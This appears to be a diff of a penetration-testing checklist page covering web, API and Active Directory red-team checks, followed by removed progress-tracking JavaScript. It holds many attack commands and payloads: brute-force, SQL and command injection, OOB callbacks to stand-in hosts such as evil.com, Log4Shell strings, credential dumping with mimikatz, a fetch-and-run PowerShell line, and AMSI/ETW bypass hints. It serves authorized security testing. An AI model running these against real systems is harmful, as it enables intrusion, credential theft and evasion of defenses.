+| 1.2.8 | Hidden parameter fuzzing | Medium | `param-miner` (Burp extension) \| `x8 -u https://target.com -w params.txt` | ☐ |
+| 1.2.9 | Crawling & Authenticated Spider | Info | Burp crawl mode, `hakrawler -u https://target.com -depth 3` | ☐ |
+| 1.2.10 | Version-Diff (identify JS/API version changes) | Low | `urlscan.io` history, compare JS hashes | ☐ |
+
+## 1.3 — Authentication Testing
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 1.3.1 | Username Enumeration (login/forgot-pw/register) | Medium | Trigger differential responses: `ffuf -u https://target.com/login -d "user=FUZZ&pass=x" -w users.txt -mr "invalid user"` | ☐ |
+| 1.3.2 | Default/Credential Bruteforce | Critical | `hydra -L users.txt -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"` | ☐ |
+| 1.3.3 | Password Policy Weakness | Medium | Register/reset with `a`, `123` — confirm no complexity enforcement | ☐ |
+| 1.3.4 | No Rate Limiting / No Account Lockout | High | Burp Intruder: 100 failed logins → still no lockout? Turbo Intruder for speed | ☐ |
+| 1.3.5 | Brute-force protections bypass | High | Change `X-Forwarded-For: FUZZ` per request; rotate user-agent; add `null` byte in creds | ☐ |
+| 1.3.6 | Weak Password Reset Implementation | Critical | Test: token reuse, token leakage (referrer), user-controlled reset email, predictable tokens, no expiry | ☐ |
+| 1.3.7 | Session Fixation on Login | High | Grab pre-auth cookie → login → does cookie value stay same? | ☐ |
+| 1.3.8 | Remember-Me token flaws | High | Check if token = static hash, reversible, non-expiring | ☐ |
+| 1.3.9 | MFA Bypass | Critical | Test: response manipulation (`"success":true`), null OTP, OTP reuse, race condition, brute-force 4-digit OTP without lockout, direct-to-dashboard endpoints | ☐ |
+| 1.3.10 | Credential Stuffing feasibility | High | Check login error uniformity + rate limits | ☐ |
+| 1.3.11 | OAuth/SSO Misconfig | High | Test: open redirect on `redirect_uri`, missing `state` (CSRF), token leakage to referrer, implicit flow token exposure | ☐ |
+| 1.3.12 | JWT Attacks | Critical | `jwt_tool <token>` — check `alg:none`, weak HMAC secret (`jwt_tool -C -d rockyou.txt`), `kid` injection, `jku`/`x5u` SSRF, alg confusion RS256→HS256 | ☐ |
+| 1.3.13 | Password in URL/Logs | Medium | Check GET-based login, tokens in query strings | ☐ |
+| 1.3.14 | Logout doesn't invalidate session | Medium | Logout → replay old session token → still valid? | ☐ |
+
+## 1.4 — Session Management
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 1.4.1 | Cookie attributes missing (Secure/HttpOnly/SameSite) | Low | `curl -sI https://target.com` — inspect Set-Cookie flags | ☐ |
+| 1.4.2 | Session token entropy | High | Collect 1000 tokens → check sequential/predictable (`burp sequencer`) | ☐ |
+| 1.4.3 | Session not rotated after login/privilege change | High | Compare pre/post-auth cookie | ☐ |
+| 1.4.4 | Concurrent sessions allowed | Low | Login same user 2 browsers → old session invalid? | ☐ |
+| 1.4.5 | Session timeout missing (long idle) | Low | Leave session idle 8+ hours → still valid? | ☐ |
+| 1.4.6 | CSRF token missing on state-changing requests | Medium | Burp → remove token → request still succeeds? | ☐ |
+
+## 1.5 — Authorization & Access Control (IDOR focus — #1 real-world finding)
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 1.5.1 | IDOR on GET (objects/IDs) | High/Critical | Capture request → swap `id=1234` → `id=1235` — response changes to other user's data? Use Autorize/Burp Match-Replace | ☐ |
+| 1.5.2 | IDOR on POST/PUT/DELETE | Critical | Same object-swap on write operations (change email, delete resource of others) | ☐ |
+| 1.5.3 | IDOR in UUID/GUID (verify non-enumerable, but still test) | High | Swap UUIDs between accounts | ☐ |
+| 1.5.4 | Horizontal PrivEsc (user→user) | Critical | Low-priv user A → access user B's resources | ☐ |
+| 1.5.5 | Vertical PrivEsc (user→admin) | Critical | Access `/admin/*` endpoints as normal user; remove role from request body | ☐ |
+| 1.5.6 | Function-level auth bypass | Critical | Access admin JS functions/URLs directly: `/admin/deleteUser.php?id=1` | ☐ |
+| 1.5.7 | Mass Assignment / Parameter Pollution | High | Add `role=admin`, `isAdmin=true`, `price=1`, `user_id=victim` to registration/profile update | ☐ |
+| 1.5.8 | HTTP Method Bypass | High | `curl -X PUT/DELETE/PATCH https://target.com/api/user/1` — methods not blocked? `OPTIONS` check | ☐ |
+| 1.5.9 | Forcing Browsing to authenticated pages unauthenticated | High | curl admin URL in incognito | ☐ |
+| 1.5.10 | Verb Tampering on auth checks | High | `HEAD` requests, mixed-case URLs, trailing dots/slashes | ☐ |
+| 1.5.11 | Referer-based access control | Medium | Remove/change Referer header — auth still enforced? | ☐ |
+| 1.5.12 | Step-skipping in multi-step flows | High | Jump to step 3 of checkout/wizard directly | ☐ |
+
+## 1.6 — Injection Flaws
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 1.6.1 | SQL Injection (Error-based) | Critical | `' " \ ) -- -+` in all params → grep `sql syntax, mysql, oracle, sqlite` in response | ☐ |
+| 1.6.2 | SQLi (sqlmap — authorized scope ONLY) | Critical | `sqlmap -u "https://target.com/item?id=1" --batch --dbs --random-agent --tamper=space2comment` | ☐ |
+| 1.6.3 | Blind/Time-based SQLi | Critical | `sqlmap -u URL --technique=BT --level=5 --risk=3` \| manual `1' AND SLEEP(5)-- -` | ☐ |
+| 1.6.4 | Second-order SQLi | Critical | Inject in profile field → trigger elsewhere (search/admin panel) | ☐ |
+| 1.6.5 | NoSQL Injection | Critical | `' \|\| '1'=='1` \| `{"username":{"$ne":""}}` \| `$gt`/`$regex` operators \| `nosqlmap -u URL` | ☐ |
+| 1.6.6 | OS Command Injection | Critical | `; id` \| `&& id` \| `` `id` `` \| `$(id)` — verify with OOB: `; curl http://your-collab.burpcollab.net/$(whoami)` | ☐ |
+| 1.6.7 | Blind Command Injection (OOB) | Critical | ``; nslookup `whoami`.oob.example.com`` \| Burp Collaborator \| interactsh (`interactsh-client`) | ☐ |
+| 1.6.8 | Template Injection (SSTI) | Critical | `${7*7}` `{{7*7}}` `<%= 7*7 %>` → check `49`. Fingerprint: `{{7*'7'}}` = `7777777` (Jinja), `49` (Twig) | ☐ |
+| 1.6.9 | Expression Language / Code Injection | Critical | `${Runtime.getRuntime().exec("id")}` (Java EL) — OGNL: `%{#context}` (Struts) | ☐ |
+| 1.6.10 | XPath Injection | High | `' or 1=1 or '` → error/diff response | ☐ |
+| 1.6.11 | LDAP Injection | High | `*)(uid=*))((uid=*` on AD-backed logins | ☐ |
+| 1.6.12 | Header Injection / CRLF | Medium | `%0d%0aSet-Cookie:pwn=1` in redirect params | ☐ |
+| 1.6.13 | HTML Injection (non-XSS context) | Low | Inject `<h1>x</h1>` in email/username fields | ☐ |
+| 1.6.14 | Log Injection / Log4Shell | Critical | `${jndi:ldap://oob.example.com/a}` in UA/referer/any header + interactsh listener | ☐ |
+| 1.6.15 | HTTP Parameter Pollution | Medium | `?id=1&id=2` — behavior diff front-end vs backend | ☐ |
+
+## 1.7 — XSS Family
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 1.7.1 | Reflected XSS | High | Payloads: `<script>alert(1)<\/script>` → `"><img src=x onerror=alert(1)>` → `<svg onload=alert(1)>` → use polyglots | ☐ |
+| 1.7.2 | Stored/Persistent XSS | High | Inject in profile fields, comments, filenames, user-agent (stored in admin logs!) | ☐ |
+| 1.7.3 | DOM-based XSS | High | Check `document.location`, `document.URL`, `document.referrer`, `innerHTML`, `eval` sinks in JS — grep via `grep -E "location\|innerHTML\|eval"` | ☐ |
+| 1.7.4 | Blind XSS | High | `<script src="https://xss.ht/x.js"><\/script>` (XSS Hunter) — inject into support tickets, UA, contact forms, password fields | ☐ |
+| 1.7.5 | XSS Filter/WAF Bypass | High | `<svg/onload=alert(1)>`, `<details open ontoggle=alert(1)>`, `jav&#x09;ascript:alert(1)`, Unicode/nested encoding, `<img src=x:alert(alt) onerror=eval(src) alt=1>` | ☐ |
+| 1.7.6 | Mutation XSS (mXSS) | High | Test with unusual nesting: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">` | ☐ |
+| 1.7.7 | XSS in file uploads (SVG) | High | Upload SVG: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>` | ☐ |
+| 1.7.8 | Self-XSS escalation | Low | Combine with login CSRF/OAuth to chain | ☐ |
+| 1.7.9 | CSP Bypass | Medium | Check `Content-Security-Policy` → look for `unsafe-inline`, open whitelists, JSONP endpoints, base-uri missing | ☐ |
+
+## 1.8 — SSRF, CSRF, XXE, Deserialization
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 1.8.1 | SSRF — URL params | Critical | Change `url=http://169.254.169.254/latest/meta-data/` (AWS metadata), `http://localhost:8080/`, internal IPs | ☐ |
+| 1.8.2 | SSRF Bypass (filters) | Critical | `http://127.1`, `http://0x7f000001`, `http://[::]:80`, `http://127.0.0.1@evil.com`, DNS rebinding, redirect-based (`evil.com/redirect → localhost`), decimal IP `http://2130706433` | ☐ |
+| 1.8.3 | Blind SSRF (OOB) | Critical | Inject Collaborator/interactsh URL in every URL-accepting field (webhooks, import, avatar-URL, PDF generators) | ☐ |
+| 1.8.4 | SSRF → RCE (Gopher) | Critical | Gopher protocol to internal Redis/MySQL: `gopher://127.0.0.1:6379/_set%0d%0a...` | ☐ |
+| 1.8.5 | CSRF on state-changing actions | Medium | Generate PoC via Burp Engagement Tools → test without token/Referer | ☐ |
+| 1.8.6 | CSRF via SameSite bypass | Medium | If `SameSite=Lax` → find GET-based state change; popup/POST chain | ☐ |
+| 1.8.7 | XXE (file read) | Critical | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>` in XML uploads/APIs | ☐ |
+| 1.8.8 | Blind XXE (OOB) | Critical | External DTD: `<!ENTITY % dtd SYSTEM "http://evil.com/x.dtd">` + param entities → exfil via HTTP | ☐ |
+| 1.8.9 | XXE via file upload (docx/xlsx/svg) | Critical | Inject XXE entity into `word/document.xml` inside docx | ☐ |
+| 1.8.10 | Insecure Deserialization (PHP) | Critical | `phpggc` — generate gadget chains for Laravel/WordPress/Monolog, base64 → inject in cookies | ☐ |
+| 1.8.11 | Insecure Deserialization (Java) | Critical | Java magic bytes `rO0AB`/`aced0005` in cookies → `ysoserial` gadget chains | ☐ |
+| 1.8.12 | Insecure Deserialization (.NET) | Critical | `ViewState` unauthenticated? → `ysoserial.net` + machine-key leak (via other vuln) → RCE | ☐ |
+| 1.8.13 | Insecure Deserialization (Python/Ruby) | Critical | Pickle (`gopickle`), Ruby `Marshal` — `universal_rce` gadgets | ☐ |
+
+## 1.9 — File Upload & Business Logic
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 1.9.1 | Unrestricted File Upload → RCE | Critical | Upload `shell.php` → variations: `.php5, .phtml, .php.jpg, shell.php%00.jpg`; bypass via double ext, trailing dot/space | ☐ |
+| 1.9.2 | Content-Type/Signature Bypass | Critical | Change `Content-Type: image/jpeg` with PHP body; magic bytes `GIF89a` prepended | ☐ |
+| 1.9.3 | Path Traversal in filename | High | Filename `../../../../var/www/html/shell.php` | ☐ |
+| 1.9.4 | Race Condition upload | High | Upload → immediately access while AV/parser reads → race (upload buster) | ☐ |
+| 1.9.5 | Price/Amount Tampering | Critical | Modify price in POST checkout, negative quantities, currency swap | ☐ |
+| 1.9.6 | Integer Overflow/Negative values | High | `quantity=-1`, `qty=99999999999`, `discount=100` | ☐ |
+| 1.9.7 | Coupon/Voucher abuse | Medium | Reuse, race-condition redemption (10 parallel requests), predictable codes | ☐ |
+| 1.9.8 | Email/Phone verification bypass | Medium | Change email after verification; use `victim@target.com@attacker.com` tricks; verify via response manipulation | ☐ |
+| 1.9.9 | Workflow bypass (payment) | Critical | Skip payment step, tamper `status=success`, replay transaction | ☐ |
+| 1.9.10 | Web Cache Poisoning/Deception | High | Unkeyed headers: inject via `X-Forwarded-Host` → check cache-hit response diff; `?test` → user-specific page cached? | ☐ |
+| 1.9.11 | HTTP Request Smuggling | Critical | `CL.TE / TE.CL / TE.TE` — test with Burp HTTP Request Smuggler extension | ☐ |
+| 1.9.12 | HTTP Host Header Poisoning | High | Change `Host:` → password-reset links use injected host? Cache poisoning chain? | ☐ |
+| 1.9.13 | Open Redirect | Low/Medium | `?next=https://evil.com` `?url=//evil.com` `?next=///evil.com` `?next=/%2f%2fevil.com` `?next=//evil.com@good.com` | ☐ |
+
+## 1.10 — WAF Detection & Bypass (applies to all above)
+
+| # | Technique | Method | Status |
+| --- | --- | --- | --- |
+| 1.10.1 | Fingerprint WAF | `wafw00f target.com` | ☐ |
+| 1.10.2 | Encoding Bypass | URL encode ×2 (`%253Cscript%253E`), Unicode: `<scri%u0070t>`, Hex `\x3c` | ☐ |
+| 1.10.3 | Case/Comment Obfuscation | `<ScRiPt>` `<scr/**/ipt>` `SEL/**/ECT` `sElEcT+1` | ☐ |
+| 1.10.4 | HTTP Parameter Pollution | WAF checks first param, backend reads last: `?q=clean&q=<payload>` | ☐ |
+| 1.10.5 | Content-Type Swap | Switch to `application/json` / `text/xml` / form-data for payload delivery | ☐ |
+| 1.10.6 | Chunked Transfer Encoding | `Transfer-Encoding: chunked` — split payload across chunks | ☐ |
+| 1.10.7 | HTTP Version/Method Evasion | HTTP/1.0 without Host, raw TCP via `netcat`, POST body without CT | ☐ |
+| 1.10.8 | Path/Route Bypass | `/admin` → `//admin`, `/./admin`, `/admin/`, `/ADMIN`, `/%2fadmin`, `/..;/admin`, `/;/admin` | ☐ |
+| 1.10.9 | Header-based IP trust | `X-Forwarded-For: 127.0.0.1`, `X-Real-IP`, `X-Original-URL`, `X-Rewrite-URL` | ☐ |
+| 1.10.10 | SQLi WAF bypass payloads | `SeLeCt/**/1` \| `UnIoN/**/aLl+SeLeCt` \| `/*!50000SeLeCt*/` \| terminate with `%00` | ☐ |
+| 1.10.11 | Rate-limit evasion | Rotate UA, X-Forwarded-For randomization, distributed wordlist (slow-scan `ffuf -rate 5`) | ☐ |
+| 1.10.12 | Origin IP discovery (bypass CDN) | Historical DNS (SecurityTrails), cert SANs (`censys`), mail headers, `http://target.com:8080` direct ports | ☐ |
+
+## 1.11 — Misc / Hardening & Info Disclosure
+
+| # | Check | Severity | Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 1.11.1 | Verbose Error Messages / Stack Traces | Low | Force errors → Java/PHP/.NET stack trace exposure | ☐ |
+| 1.11.2 | Security Headers Audit | Low | `securityheaders.com` / `curl -sI` — CSP, HSTS, X-Frame-Options, X-Content-Type-Options | ☐ |
+| 1.11.3 | Sensitive info in responses (debug) | Medium | Check for `X-Debug`, debug params `?debug=1`, `X-Powered-By`, `Server` version | ☐ |
+| 1.11.4 | Source Code/Comments Disclosure | Low | View-source, .map files (`app.js.map`), HTML comments with credentials | ☐ |
+| 1.11.5 | CORS Misconfiguration | High | `Origin: evil.com` reflected? `Access-Control-Allow-Credentials: true`? Null origin? Subdomain wildcard trust → chain with XSS | ☐ |
+| 1.11.6 | Clickjacking | Low | No `X-Frame-Options`? → `<iframe src="https://target.com">` renders? | ☐ |
+| 1.11.7 | Subdomain takeover | High | `subjack -w subs.txt -t 100 -ssl -v` — CNAME → dangling cloud services | ☐ |
+| 1.11.8 | Default credentials on admin panels | Critical | `admin:admin` on `/manager/html` (Tomcat), `/wp-admin`, printers, IoT | ☐ |
+| 1.11.9 | Email Spoofing (SPF/DMARC) | Medium | `dig txt target.com` — missing `-all` / no DMARC → `swaks` spoof test | ☐ |
+| 1.11.10 | TLS/SSL Misconfig | Medium | `testssl.sh target.com` — weak ciphers, TLS1.0, missing HSTS | ☐ |
+
+# PART 2: API PENTESTING (OWASP API Security Top 10)
+
+## 2.1 — API Recon & Endpoint Mapping
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 2.1.1 | API Discovery | Info | `/swagger.json /openapi.json /api-docs /swagger /redoc /graphql` — also check `/.well-known/` | ☐ |
+| 2.1.2 | Wordlist-based endpoint fuzz | Info | `ffuf -u https://target.com/api/FUZZ -w api-endpoints.txt -mc all -fc 404` (use `api-wordlists` by assetnote) | ☐ |
+| 2.1.3 | HTTP Method enumeration | High | `ffuf -u https://target.com/api/v1/user -X FUZZ -w methods.txt` (GET,POST,PUT,PATCH,DELETE,TRACE) | ☐ |
+| 2.1.4 | Old API versions alive | High | `/api/v1/` vs `/api/v2/` — v1 unpatched/less protected? | ☐ |
+| 2.1.5 | GraphQL introspection | High | `curl -X POST https://target.com/graphql -d '{"query":"{__schema{types{name}}}"}'` → use **InQL** (Burp) | ☐ |
+| 2.1.6 | Documentation endpoints in prod | Medium | Swagger UI exposed w/o auth | ☐ |
+
+## 2.2 — OWASP API Top 10 Testing
+
+| # | API Top 10 | Severity | Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 2.2.1 | **API1: BOLA (Broken Object Level Authorization)** | Critical | Swap object IDs in ALL endpoints — user IDs, file IDs, order IDs. API equivalent of IDOR but harder to detect: test with 2+ accounts systematically. Use Autorize | ☐ |
+| 2.2.2 | **API2: Broken Authentication** | Critical | No auth on endpoints? Token sent in URL? Weak JWT signing? Bruteforce OTP? Test `/api/user/me` without token | ☐ |
+| 2.2.3 | **API3: Broken Object Property Level Authorization** | Critical | Mass assignment: add `{"role":"admin","is_verified":true,"price":0}` to PATCH/POST; response leaks password hash/PII (excessive data exposure) | ☐ |
+| 2.2.4 | **API4: Unrestricted Resource Consumption** | Medium | No rate limit → `ffuf -mc 200 -rate 1000`; huge page-size params `?limit=99999`; expensive queries `?sort=f1,f2,...f500` | ☐ |
+| 2.2.5 | **API5: Function-Level Authorization Bypass** | Critical | Call admin functions as user: `/api/admin/users/delete` — hide-URL ≠ security. Test all admin routes w/ user token | ☐ |
+| 2.2.6 | **API6: Unrestricted Business Flows** | High | Workflow abuse: coupon ×100, review spam, vote manipulation, reservation blocking | ☐ |
+| 2.2.7 | **API7: SSRF** | Critical | All URL-accepting params → internal targets + metadata endpoints (see 1.8.x) | ☐ |
+| 2.2.8 | **API8: Security Misconfiguration** | High | Verbose errors, CORS wildcard, methods allowed (TRACE), default pages, missing TLS | ☐ |
+| 2.2.9 | **API9: Improper Inventory Management** | Medium | Find old/ghost API versions, staging APIs (`staging.target.com/api`), deprecated-but-alive endpoints | ☐ |
+| 2.2.10 | **API10: Unsafe Consumption of APIs** | High | Target consumes 3rd-party API → SSRF-ish, injection via upstream response, XML from partner parsed unsafely | ☐ |
+
+## 2.3 — GraphQL-Specific
+
+| # | Check | Severity | Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 2.3.1 | Introspection enabled in prod | Medium | Query `__schema` — dump w/ InQL, graphw00f | ☐ |
+| 2.3.2 | Authorization per-field/per-object | Critical | Introspect → query user fields as other user | ☐ |
+| 2.3.3 | Batching attacks (rate-limit bypass) | High | Send array of queries: `[{query:...},{query:...}×100]` — 1 request = 100 attempts | ☐ |
+| 2.3.4 | Mutation abuse | Critical | Call write mutations w/o proper checks | ☐ |
+| 2.3.5 | Field suggestion leakage | Low | `{"query":"{ usr }"}` → "Did you mean user?" → enumerate schema when introspection off | ☐ |
+| 2.3.6 | Depth/complexity attacks (DoS) | Medium | Deep nested query: `{a{b{c{...×1000}}}}` | ☐ |
+
+## 2.4 — API Rate Limiting & Abuse (Critical for fintech/logistics clients)
+
+| # | Check | Severity | Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 2.4.1 | Rate limit on auth endpoints | High | 1000 requests → any 429/block? | ☐ |
+| 2.4.2 | Rate-limit bypass | High | Case-rotate endpoint `/aPi/LoGiN`, trailing slash, HPP, rotate IP headers | ☐ |
+| 2.4.3 | OTP/PIN bruteforce | Critical | 4-6 digit OTP, no lockout → Turbo Intruder race | ☐ |
+
+# PART 3: RED TEAMING — AD / CORPORATE ENVIRONMENT
+
+## 3.1 — External → Initial Access
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 3.1.1 | External Attack Surface | Info | `nmap -sS -Pn -p- <external_IP>`, `shodan.io`, certificate CNs | ☐ |
+| 3.1.2 | Password Spraying OWA/ADFS/Azure | Critical | `nxc smb <ip> -u users.txt -p 'Company@2024' --continue-on-success` \| `MSOLSpray` (Azure) | ☐ |
+| 3.1.3 | VPN endpoint attacks | High | Pulse SSL VPN CVEs, `nmap --script ssl-enum-ciphers`; default creds on VPN portals | ☐ |
+| 3.1.4 | Password reset spoofing / phishing infra | High | `gophish` + evilginx2 for ADFS/O365 (authorized only) | ☐ |
+| 3.1.5 | Public RDP exposed | Critical | `hydra -L u -P p rdp://target` + NLA bypass checks | ☐ |
+
+## 3.2 — Internal Reconnaissance (Post-Foothold)
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 3.2.1 | Situational Awareness | Info | `whoami /all` \| `ipconfig /all` \| `systeminfo` \| `net user /domain` \| `net group "domain admins" /domain` | ☐ |
+| 3.2.2 | AD Enumeration w/ PowerView | Info | `Get-DomainUser -Properties samaccountname,description` \| `Get-DomainGroup` \| `Get-DomainOU` \| `Find-LocalAdminAccess` | ☐ |
+| 3.2.3 | BloodHound (SharpHound ingest) | Critical | `SharpHound.exe -c All` → import → find shortest path Domain Admin | ☐ |
+| 3.2.4 | SMB/Shares enumeration | High | `nxc smb <dc_ip> -u user -p pass --shares` \| `smbclient -L //dc -U user` | ☐ |
+| 3.2.5 | Kerberoasting-able SPNs | Critical | `GetUserSPNs.py -dc-ip <ip> domain/user:pass -request` → `hashcat -m 13100` | ☐ |
+| 3.2.6 | AS-REP Roastable accounts | Critical | `GetNPUsers.py domain/ -usersfile users.txt -no-pass` → `hashcat -m 18200` | ☐ |
+| 3.2.7 | LAPS misconfiguration | High | `nxc smb <ip> -u u -p p --laps` \| read `ms-mcs-AdmPwd` if rights | ☐ |
+| 3.2.8 | Passwords in description/attributes | High | `Get-DomainUser -LDAPFilter 'Description=*pass*' -Properties description` | ☐ |
+| 3.2.9 | Check MS17-010 (EternalBlue) legacy | Critical | `nmap -p445 --script smb-vuln-ms17-010 <ip>` | ☐ |
+| 3.2.10 | GPO abuse (GPP cpassword) | Critical | `gpp-decrypt <hash>` \| `Get-DomainGPO` — check SYSVOL XMLs | ☐ |
+| 3.2.11 | Zone transfer internal | High | `dig axfr <domain> @<dc_ip>` | ☐ |
+
+## 3.3 — Credential Attacks
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 3.3.1 | Local admin spray (lateral) | Critical | `nxc smb <subnet>/24 -u u -p p --local-auth` (find shared local admin) | ☐ |
+| 3.3.2 | Credential dumping (post-priv) | Critical | `mimikatz "privilege::debug" "sekurlsa::logonpasswords"` \| `lsass` dump via comsvcs/`rundll32`, `pypykatz` offline | ☐ |
+| 3.3.3 | NTLM Relay | Critical | `Responder -I eth0 -dwv` + `ntlmrelayx.py -tf targets.txt -smb2support` (capture & relay) | ☐ |
+| 3.3.4 | AS-REP / Kerberoast crack | Critical | `hashcat -m 13100 tgs.txt rockyou.txt -r rules/best64.rule` | ☐ |
+| 3.3.5 | DCSync | Critical | `secretsdump.py domain/user:pass@dc_ip` (needs DA/backup rights) | ☐ |
+| 3.3.6 | Unconstrained/Constrained Delegation abuse | Critical | `kekeo` / `Rubeus /ptt` — impersonate admin on trusted services | ☐ |
+| 3.3.7 | Resource-Based Constrained Delegation (RBCD) | Critical | `Get-NtComputerHash` + `rbcd.py` + S4U2self → DA impersonation | ☐ |
+| 3.3.8 | ADCS / Certificate Services abuse | Critical | `certipy find -u u@domain -p pass -dc-ip <ip> -vulnerable` → ESC1-ESC8 templates → `certipy req` | ☐ |
+| 3.3.9 | GMSA password extraction | Critical | `gMSADumper.py -u u -p p -d domain` | ☐ |
+| 3.3.10 | dpapi/Chrome creds | High | `mimikatz dpapi::chrome` — browser-stored creds | ☐ |
+
+## 3.4 — Privilege Escalation (Windows/Linux)
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 3.4.1 | Windows PE enumeration | Critical | `winPEAS.exe` \| `Seatbelt.exe -group=all` \| `powershell -ep bypass -c "iwr http://x/PowerUp.ps1 -UseBasicParsing \| iex; Invoke-AllChecks"` | ☐ |
+| 3.4.2 | Unquoted service paths | High | `wmic service get name,pathname \| findstr /i "Program Files"` | ☐ |
+| 3.4.3 | Service config abuse | High | `accesschk.exe -uwcqv user *` \| `sc qc <service>` (SERVICE_CHANGE_CONFIG → binPath hijack) | ☐ |
+| 3.4.4 | AlwaysInstallElevated | High | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` — both =1 → `.msi` as SYSTEM | ☐ |
+| 3.4.5 | UAC bypass | Medium | `UACME` techniques (fodhelper, computerdefaults) | ☐ |
+| 3.4.6 | SeImpersonate → Potato family | Critical | `whoami /priv` → SeImpersonate → `GodPotato`/`JuicyPotatoNG` | ☐ |
+| 3.4.7 | Kernel exploits | Critical | `systeminfo` → compare Watson/winPEAS → printnightmare, CVE-2021-1675 | ☐ |
+| 3.4.8 | Scheduled tasks / autoruns | High | `schtasks /query /fo LIST /v` \| `Get-ScheduledTask` misconfigured ones | ☐ |
+| 3.4.9 | Linux PE enumeration | Critical | `linPEAS.sh` \| `pspy` (cronjobs) \| `sudo -l` (GTFOBins) | ☐ |
+| 3.4.10 | SUID/GTFOBins | High | `find / -perm -4000 2>/dev/null` → gtfobins.github.io | ☐ |
+| 3.4.11 | Docker/LXD group escape | Critical | `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` (if in docker group) | ☐ |
+
+## 3.5 — Lateral Movement
+
+| # | Check | Severity | Commands / Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 3.5.1 | Pass-the-Hash | Critical | `nxc smb <ip> -u admin -H <NTLM>` \| `psexec.py -hashes :NTLM domain/admin@ip` | ☐ |
+| 3.5.2 | Overpass-the-hash / PtT | Critical | `Rubeus /ptt /ticket:<kirbi>` → access C$ shares | ☐ |
+| 3.5.3 | WMI/SMB exec lateral | Critical | `wmiexec.py domain/user:pass@ip` \| `atexec.py` \| `smbexec.py` | ☐ |
+| 3.5.4 | RDP session hijack | High | `tscon <id> /dest:console` (as SYSTEM) | ☐ |
+| 3.5.5 | DCOM lateral | High | `dcomexec.py` (MMC20, ShellWindows) | ☐ |
+| 3.5.6 | Golden Ticket | Critical | `mimikatz "kerberos::golden /user:fake /domain:x /sid:<sid> /krbtgt:<hash> /id:500"` | ☐ |
+| 3.5.7 | Silver Ticket | Critical | Forge TGS for service (`krbtgt`→service account hash) | ☐ |
+| 3.5.8 | Shadow Credentials / Key trust | High | `certipy shadow auto -u u@domain -p p` → NT hash of target | ☐ |
+
+## 3.6 — Defense Evasion (EDR Bypass — xct.de)
+
+| # | Check | Severity | Methodology | Status |
+| --- | --- | --- | --- | --- |
+| 3.6.1 | AMSI Bypass | High | `amsi.fail` variants — e.g., patching `AmsiScanBuffer`, `amsiInitFailed` (obfuscate, don't run plain) | ☐ |
+| 3.6.2 | ETW Patching | High | Patch `EtwEventWrite` — `[Ref].Assembly.GetType('Sys...').GetField(...).SetValue($null,[IntPtr]::MaxValue)` variants | ☐ |
+| 3.6.3 | Direct Syscalls (avoid ntdll hooks) | High | SysWhispers3 (`Jump`/`Trampoline` variants), HellsGate/HalosGate/TartarusGate | ☐ |
+</script>
 
 <script>
 (function(){
-  var KEY='vapt-checklist-progress', store={};
-  try{store=JSON.parse(localStorage.getItem(KEY)||'{}')||{};}catch(e){store={};}
-  var main=document.querySelector('main');
-
-  // wrap tables in cards
-  main.querySelectorAll('table').forEach(function(t){
-    if(t.parentElement.classList.contains('table-wrap'))return;
-    var w=document.createElement('div');w.className='table-wrap';
-    t.parentNode.insertBefore(w,t);w.appendChild(t);
-  });
-
-  // group h2 + table into sections
-  main.querySelectorAll('h2').forEach(function(h){
-    var sec=document.createElement('section');sec.className='sec';
-    h.parentNode.insertBefore(sec,h);
-    var node=h,next;
-    while(node){
-      next=node.nextElementSibling;
-      if(node.tagName==='H2'||node.classList.contains('table-wrap')){sec.appendChild(node);node=next;}
-      else break;
-    }
-  });
-
-  // colorize section numbers
-  main.querySelectorAll('h2').forEach(function(h){
-    h.innerHTML=h.innerHTML.replace(/^(\d+(?:\.\d+)*)(\s+—\s+)/,'<span class="sec-num">$1</span><span class="sep">$2</span>');
-  });
-
-  // badges + checkboxes
-  var rows=[];
-  main.querySelectorAll('table').forEach(function(table){
-    var headers=[].map.call(table.querySelectorAll('thead th'),function(th){return th.textContent.trim().toLowerCase();});
-    var iSev=headers.indexOf('severity'), iStat=headers.indexOf('status');
-    table.querySelectorAll('tbody tr').forEach(function(tr){
-      var cells=[].slice.call(tr.cells);
-      var id=cells[0]?cells[0].textContent.trim():'';
-      if(iSev>-1&&cells[iSev]){
-        var raw=cells[iSev].textContent.trim(),t=raw.toLowerCase(),cls='info';
-        if(t.indexOf('critical')>-1)cls='critical';
-        else if(t.indexOf('high')===0)cls='high';
-        else if(t.indexOf('medium')>-1)cls='medium';
-        else if(t.indexOf('low')>-1)cls='low';
-        cells[iSev].innerHTML='<span class="badge badge-'+cls+'">'+raw+'</span>';
-      }
-      if(iStat>-1&&cells[iStat]){
-        tr.dataset.rowId=id;
-        cells[iStat].classList.add('status');
-        cells[iStat].innerHTML='<span class="cb" role="checkbox" tabindex="0" aria-checked="false" aria-label="Mark '+id+' as done"></span>';
-        if(store[id])tr.classList.add('done');
-        rows.push(tr);
-      }
-    });
-  });
-
-  function updateProgress(){
